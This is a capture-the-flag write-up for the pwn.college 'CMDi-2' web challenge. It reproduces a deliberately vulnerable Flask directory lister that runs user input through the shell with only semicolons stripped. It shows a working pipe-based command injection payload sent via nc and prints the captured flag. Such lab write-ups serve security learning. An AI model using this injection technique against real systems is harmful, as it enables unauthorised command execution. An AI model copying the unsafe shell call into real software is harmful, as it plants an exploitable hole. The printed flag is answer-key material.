---
layout: page
title: "🧠 Challenge Name: CMDi-2"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🗂 Category: Web Exploitation

## 📝 Description:
You are provided with a vulnerable Flask-based web server that lists files in a directory. The application attempts to sanitize input by removing semicolons.

Your goal is to exploit command injection and retrieve the flag.

---

## 📂 Source Code:

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/checkpoint", methods=["GET"])
def challenge():
    arg = flask.request.args.get("folder", "/challenge").replace(";", "")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/checkpoint"><input type=text name=folder><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
---

## Vulnerability:

- Input is inserted directly into the shell command.
- Only semicolons are stripped (.replace(";", "")).
- You can bypass it using a pipe (|) or other shell chaining operators.

---

## Exploit Attempt:

```bash
hacker@web-security~cmdi-2:~$ printf "GET /checkpoint?folder=/+|cat+/flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Result:
```bash
<html><body>
Welcome to the dirlister service! Please choose a directory to list the files of:
<form action="/checkpoint"><input type=text name=folder><input type=submit value=Submit></form>
<hr>
<b>Output of ls -l / |cat /flag:</b><br>
<pre>pwn.college{YxL-hpFWeJ6Y3JMqKN2NnyPcKGn.QX0YTN2wSM0IzMyEzW}
</pre>
</body></html>
```

---

## Flag:
```bash
pwn.college{YxL-hpFWeJ6Y3JMqKN2NnyPcKGn.QX0YTN2wSM0IzMyEzW}
```

